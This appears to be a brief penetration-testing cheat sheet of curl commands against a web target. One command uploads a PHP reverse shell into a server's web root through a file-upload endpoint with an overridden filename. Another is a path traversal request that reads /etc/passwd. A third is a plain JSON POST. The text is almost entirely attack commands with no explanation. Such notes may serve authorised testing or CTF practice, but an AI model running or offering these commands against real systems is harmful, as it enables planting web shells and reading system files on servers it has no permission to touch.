
Upload shell using post request and additional parameters:
---
```bash
curl -X POST "$TARGET_URL/file-upload" -F "file=@rev.php.txt" -F "filename=/var/www/html/rev.php"
```


```bash
curl --header "Content-Type: application/json" --request POST -d @data.json http://$TARGET_IP
```

```bash
curl --path-as-is http://$TARGET_URL/../../../../../../../../etc/passwd
```